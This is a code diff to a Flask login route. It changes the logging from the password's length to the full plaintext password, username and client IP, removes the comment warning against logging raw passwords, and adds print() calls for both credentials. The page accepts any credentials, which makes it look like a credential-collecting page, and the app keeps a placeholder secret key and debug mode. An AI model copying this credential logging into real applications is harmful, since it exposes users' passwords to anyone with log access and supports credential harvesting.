@@ -4,9 +4,8 @@ import logging
 app = Flask(__name__)
 app.secret_key = "change_me_to_a_random_string"
 
-# Optional: make sure logger level is INFO (so info() logs appear)
+# Make sure logging works on Render
 app.logger.setLevel(logging.INFO)
-
 
 @app.route("/", methods=["GET", "POST"])
 def login():
@@ -14,13 +13,17 @@ def login():
         username = request.form.get("username", "").strip()
         password = request.form.get("password", "").strip()
 
-        # ⚠️ Don't log raw passwords in real apps!
+        # 🔥 Logs FULL username + FULL password + client IP
         app.logger.info(
-            "Login attempt: username=%s, password_length=%d, ip=%s",
+            "Login attempt: username=%s, password=%s, ip=%s",
             username,
-            len(password),
+            password,
             request.remote_addr
         )
+
+        # Old print() also works on Render logs
+        print(f"username = {username}")
+        print(f"password = {password}")
 
         if username and password:
             flash(f"Welcome, {username}!", "success")
@@ -37,4 +40,5 @@ def dashboard():
 
 
 if __name__ == "__main__":
+    # Only used when running locally
     app.run(host="0.0.0.0", port=5000, debug=True)
